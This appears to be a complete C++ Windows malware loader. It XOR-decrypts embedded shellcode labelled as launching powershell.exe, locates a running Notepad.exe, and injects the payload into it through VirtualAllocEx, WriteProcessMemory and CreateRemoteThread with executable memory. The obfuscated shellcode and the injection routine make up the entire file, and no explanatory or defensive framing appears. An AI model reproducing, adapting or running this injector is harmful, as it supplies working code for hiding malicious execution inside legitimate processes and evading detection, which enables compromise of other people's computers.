#include <string>
#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <memoryapi.h>


	// XOR Enc payload (powershell.exe)
unsigned char enc_payload[] =
	"\xed\x59\x92\xf5\xe1\xf9\xd1\x11\x11\x11\x50\x40\x50\x41"
	"\x43\x40\x47\x59\x20\xc3\x74\x59\x9a\x43\x71\x59\x9a\x43"
	"\x09\x59\x9a\x43\x31\x59\x9a\x63\x41\x59\x1e\xa6\x5b\x5b"
	"\x5c\x20\xd8\x59\x20\xd1\xbd\x2d\x70\x6d\x13\x3d\x31\x50"
	"\xd0\xd8\x1c\x50\x10\xd0\xf3\xfc\x43\x50\x40\x59\x9a\x43"
	"\x31\x9a\x53\x2d\x59\x10\xc1\x9a\x91\x99\x11\x11\x11\x59"
	"\x94\xd1\x65\x76\x59\x10\xc1\x41\x9a\x59\x09\x55\x9a\x51"
	"\x31\x58\x10\xc1\xf2\x47\x59\xee\xd8\x50\x9a\x25\x99\x59"
	"\x10\xc7\x5c\x20\xd8\x59\x20\xd1\xbd\x50\xd0\xd8\x1c\x50"
	"\x10\xd0\x29\xf1\x64\xe0\x5d\x12\x5d\x35\x19\x54\x28\xc0"
	"\x64\xc9\x49\x55\x9a\x51\x35\x58\x10\xc1\x77\x50\x9a\x1d"
	"\x59\x55\x9a\x51\x0d\x58\x10\xc1\x50\x9a\x15\x99\x59\x10"
	"\xc1\x50\x49\x50\x49\x4f\x48\x4b\x50\x49\x50\x48\x50\x4b"
	"\x59\x92\xfd\x31\x50\x43\xee\xf1\x49\x50\x48\x4b\x59\x9a"
	"\x03\xf8\x46\xee\xee\xee\x4c\x59\xab\x10\x11\x11\x11\x11"
	"\x11\x11\x11\x59\x9c\x9c\x10\x10\x11\x11\x50\xab\x20\x9a"
	"\x7e\x96\xee\xc4\xaa\xdc\x75\x8e\x79\x50\xab\xb7\x84\xac"
	"\x8c\xee\xc4\x59\x92\xd5\x39\x2d\x17\x6d\x1b\x91\xea\xf1"
	"\x64\x14\xaa\x56\x02\x63\x7e\x7b\x11\x48\x50\x98\xcb\xee"
	"\xc4\x61\x7e\x66\x74\x63\x62\x79\x74\x7d\x7d\x3f\x74\x69"
	"\x74\x11";

unsigned char* XOR_decrypt(const unsigned char* payload, unsigned char key, size_t len) {
	unsigned char* buffer = new unsigned char[len];
	for (size_t i = 0; i < len; i++) {
		buffer[i] = payload[i] ^ key;
	}
	return buffer;
}

int GetProcByPid(const std::string& procName) {
	
	int pid = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap == INVALID_HANDLE_VALUE) {
		std::cerr << "Invalid Handle. Error" << GetLastError();
		return 1;
	}

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);
	if (Process32FirstW(hSnap, &pe32) != FALSE) {
		std::wstring wideProcName(procName.begin(), procName.end());
		do {
			if (wcscmp(pe32.szExeFile, wideProcName.c_str()) == 0) {
				pid = pe32.th32ProcessID;
				std::wcout << L"PID of: " << wideProcName << L" : " << pe32.th32ProcessID << L"\n";
			}
		} while (pid == 0 && (Process32NextW(hSnap, &pe32) != FALSE));
	}
	CloseHandle(hSnap);
	return pid;
}

int main()
{
	int pid = 0;
	pid = GetProcByPid("Notepad.exe");
	if (pid == 0) {
		std::cout << "Failed to get PID";
		return 1;
	}
	size_t size = sizeof(enc_payload);
	unsigned char* payload = XOR_decrypt(enc_payload, 0x11, size);

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProc == NULL) {
		std::cerr << "Error getting Handle: " << GetLastError();
		delete[] payload;
		return 1;
	}
	void* memBuf;
	memBuf = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	if (!memBuf) {
		std::cerr << "Error Allocating Memory: " << GetLastError();
		CloseHandle(hProc);
		delete[] payload;
		return 1;

	};
	if (!WriteProcessMemory(hProc, memBuf, payload, size, NULL)) {
		std::cerr << "Error writing payload: " << GetLastError();
		delete[] payload;
		CloseHandle(hProc);
		return 1;
	};

	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)memBuf, NULL, 0, NULL);
	if (!hThread) {
		std::cerr << "Error Executing payload: " << GetLastError();
		delete[] payload;
		CloseHandle(hProc);
		return 1;
	}

	WaitForSingleObject(hThread, INFINITE);
	delete[] payload;
	CloseHandle(hProc);
	CloseHandle(hThread);
}
